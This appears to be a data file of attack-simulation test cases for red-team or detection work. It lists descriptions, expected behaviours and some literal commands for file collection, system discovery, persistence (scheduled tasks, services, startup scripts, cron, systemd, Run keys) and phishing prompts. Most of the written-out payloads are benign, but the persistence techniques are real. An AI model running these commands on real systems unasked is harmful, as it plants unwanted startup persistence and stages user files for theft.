attacks.description: Collects content from all .txt files in the TEMP directory and saves it to a new file named collected_data.txt in the same directory.
attacks.expected_behavior: The command collects data from .txt files in the TEMP directory and saves the output to a new file without requiring admin privileges.

attacks.description: Collects content from all .log files in the TEMP directory and appends it to a new file named log_collection.txt in the same directory.
attacks.expected_behavior: The command collects data from .log files in the TEMP directory and saves the output to a new file without requiring admin privileges.

attacks.description: Compresses all files in the TEMP directory into a zip archive named collected_data.zip in the same directory, overwriting any existing file with the same name.
attacks.expected_behavior: The command compresses data from the TEMP directory into a zip file, potentially overwriting existing files, but does not require admin privileges.

attacks.description: Basic automated collection: Copy all PDFs from user's Documents to a staging directory
attacks.expected_behavior: Creates a local collection directory and copies PDF files from the user's Documents folder into it. Fails silently if no PDFs exist.

attacks.description: Intermediate automated collection: Find Office documents in Downloads and compress them into a ZIP archive
attacks.expected_behavior: Searches for .docx and .xlsx files in the Downloads directory and adds them to a compressed archive named artifacts.zip in the home directory.

attacks.description: Displays detailed configuration information about a computer and its operating system, including service pack levels.
attacks.expected_behavior: Displays system information in the command prompt window.

attacks.description: Displays all current TCP/IP network configuration values.
attacks.expected_behavior: Displays detailed TCP/IP configuration information.

attacks.description: Displays user, group and privilege information for the user who is currently logged on to the local system.
attacks.expected_behavior: Displays the current user's privileges.

attacks.description: Basic system information discovery using uname to retrieve kernel and OS details.
attacks.expected_behavior: Outputs kernel name, hostname, kernel version, and architecture to stdout.

attacks.description: Intermediate discovery command combining OS distribution, CPU, and memory information.
attacks.expected_behavior: Prints OS version details, CPU architecture and core count, and human-readable memory usage.

attacks.description: Advanced obfuscated discovery command using full paths and command substitution to gather kernel version, user context, and process file descriptors.
attacks.expected_behavior: Outputs kernel release, current user and group IDs, and lists first five file descriptors of init process if accessible.

attacks.description: Creates a scheduled task using legacy schtasks.exe to run a benign command hourly
attacks.expected_behavior: A scheduled task named 'UpdateCheck' is created and will execute hourly, writing 'Test' to a log file in %TEMP%. No elevated privileges needed for user-level task.

attacks.command: sc.exe create "DataSyncService" binPath= "cmd.exe /c echo Sync started & timeout /t 30" start= auto
attacks.description: Creates a Windows service using sc.exe that runs a benign command on startup
attacks.expected_behavior: A new service named 'DataSyncService' is created and set to start automatically. It will run a simple echo and delay command. Requires administrator privileges to create services.

attacks.command: powershell -Command "mkdir '$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' -ErrorAction SilentlyContinue; Set-Content -Path '$env:APPDATA\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\update.vbs' -Value 'Set objShell = CreateObject(\"WScript.Shell\") : objShell.Run \"notepad.exe\", 0' -Force"
attacks.description: Creates a VBS script in user startup folder to run notepad silently on login
attacks.expected_behavior: A VBS script is placed in the user's Startup folder that will silently launch Notepad at login. Uses PowerShell for file creation with proper escaping and directory safety checks.

attacks.command: echo '@reboot root /bin/sh -c "while true; do /bin/sleep 60; done"' > /etc/cron.d/persistence_test && chmod 600 /etc/cron.d/persistence_test
attacks.description: Creates a cron job that executes a persistent loop on reboot using root privileges
attacks.expected_behavior: A new cron job is installed in /etc/cron.d that runs a harmless infinite loop at system boot. The job runs as root and sleeps indefinitely, simulating a persistent process. Requires root to write to /etc/cron.d.

attacks.command:
printf '[Unit]
Description=Test Persistence Service
[Service]
ExecStart=/bin/sh -c "/bin/sleep infinity"
Restart=always
[Install]
WantedBy=multi-user.target' > /etc/systemd/system/test-persistence.service && systemctl daemon-reload && systemctl enable test-persistence.service
attacks.description: Creates and enables a systemd service that starts on boot and runs a persistent sleep process
attacks.expected_behavior: A systemd service file is created in /etc/systemd/system, reloaded, and enabled to start at boot. The service runs a harmless infinite sleep process and restarts if terminated. Simulates persistence via system service creation.

attacks.description: Capture the entire screen and save it as a PNG file named screenshot.png
attacks.expected_behavior: The command captures the entire screen and saves it as a PNG file in the current working directory.

attacks.description: Capture the screen and save it as a video file named output.mp4
attacks.expected_behavior: The command captures the screen and saves it as a video file in the current working directory. It may require additional packages to be installed.

attacks.description: Interactively capture a selected area of the screen and save it as a PNG file named screenshot.png
attacks.expected_behavior: The command allows the user to select an area of the screen to capture and saves it as a PNG file in the current working directory.

attacks.command: reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "UpdateChecker" /t REG_SZ /d "cmd.exe /c echo Running at startup > \"%USERPROFILE%\StartupLog.txt\"" /f
attacks.description: Adds a basic persistence entry in the current user's Run key to execute a benign command on login.
attacks.expected_behavior: A registry entry is created under HKCU\Software\Microsoft\Windows\CurrentVersion\Run named 'UpdateChecker'. On next user logon, it will execute a command that writes a timestamped message to StartupLog.txt in the user's profile. This does not require admin rights and uses only built-in reg.exe.

attacks.description: Uses RunOnce key to schedule a PowerShell command that logs output after a delay, simulating delayed execution on startup.
attacks.expected_behavior: Creates a RunOnce entry that executes a PowerShell command during the next user logon. The command waits 5 seconds, then appends 'Maintenance complete' to a log file in %TEMP%. RunOnce entries are processed once and then removed by Windows. Uses built-in reg.exe and standard PowerShell cmdlets safely.

attacks.description: Creates a machine-wide persistence entry in the local machine Run key to log system time on every boot.
attacks.expected_behavior: Adds a registry value under HKLM\Software\Microsoft\Windows\CurrentVersion\Run named 'SystemSync'. On every system boot, it runs a command that appends the current time to system_sync.log in %PROGRAMDATA%. This requires administrative privileges due to HKLM access. Uses only built-in reg.exe and cmd.exe, no external tools or unsafe operations.

attacks.description: Open the root user's crontab for editing to add a new entry for a malicious program
attacks.expected_behavior: The system will execute the commands added to the crontab at the specified times

attacks.description: Enable and start a malicious systemd service to achieve persistence
attacks.expected_behavior: The system will start the malicious service at boot time and whenever it is explicitly started

attacks.description: Append a new cron job to the system-wide crontab to run a malicious program at regular intervals
attacks.expected_behavior: The system will execute the malicious program at the specified intervals

attacks.command: powershell -Command "Add-Type -AssemblyName System.Windows.Forms; $form = New-Object System.Windows.Forms.Form; $form.Text = 'Phishing Simulation'; $form.Size = New-Object System.Drawing.Size(300,200); $form.StartPosition = 'CenterScreen'; $label = New-Object System.Windows.Forms.Label; $label.Text = 'Please enter your credentials'; $label.AutoSize = $true; $label.Location = New-Object System.Drawing.Point(10,10); $form.Controls.Add($label); $form.ShowDialog()"
attacks.description: Simulate a phishing prompt using Windows Forms
attacks.expected_behavior: A form will appear asking for credentials, demonstrating a phishing simulation.

attacks.command: cmd.exe /c echo This is a phishing email simulation > %TEMP%\phishing_email.txt
attacks.description: Create a file that simulates a phishing email
attacks.expected_behavior: A file named 'phishing_email.txt' will be created in the temporary directory, containing a benign message.

attacks.description: Simulate a phishing alert using beep and host write
attacks.expected_behavior: The system will beep, and a message will be displayed in the console, simulating a phishing alert.

attacks.command: echo 'This is a phishing email' > phishing_email.txt
attacks.description: Basic phishing simulation by creating a text file with a phishing message
attacks.expected_behavior: Creates a text file named phishing_email.txt with a benign phishing message

attacks.description: Intermediate phishing simulation by downloading a benign phishing webpage
attacks.expected_behavior: Downloads a benign phishing webpage from a non-existent URL and saves it as phishing_page.html

attacks.description: Advanced phishing simulation by sending a phishing email to a non-existent endpoint
attacks.expected_behavior: Sends a benign phishing email to a non-existent endpoint using curl
